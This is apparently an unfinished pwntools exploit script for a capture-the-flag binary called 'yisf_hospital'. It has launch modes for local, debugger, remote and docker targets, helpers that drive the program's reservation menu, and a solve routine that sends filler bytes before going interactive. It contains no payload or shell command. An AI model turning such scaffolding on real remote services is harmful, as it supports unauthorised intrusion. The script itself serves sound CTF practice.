#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('yisf_hospital')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def reservation(idx, disease, name):
    io.sendlineafter(b">>>", b"1")
    io.sendlineafter(b">>>", str(idx+1).encode())
    io.sendafter(b">>>", disease)
    io.sendafter(b">>>", name)


def reservation_cancel(idx):
    io.sendlineafter(b">>>", b"2")
    io.sendlineafter(b">>>", str(idx+1).encode())

def edit_reservation(idx, disease, name):
    io.sendlineafter(b">>>", b"3")
    io.sendlineafter(b">>>", str(idx+1).encode())
    io.sendafter(b">>>", disease)
    io.sendafter(b">>>", name)

def review(name):
    io.sendlineafter(b">>>", b"5")
    io.sendlineafter(b">", name)


def solve():

    io.sendafter(b">>>", b"A"*0xf)

    reservation(0, b"A"*8, b"B"*8)
    edit_reservation(0, b"A"*8, b"B"*8)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

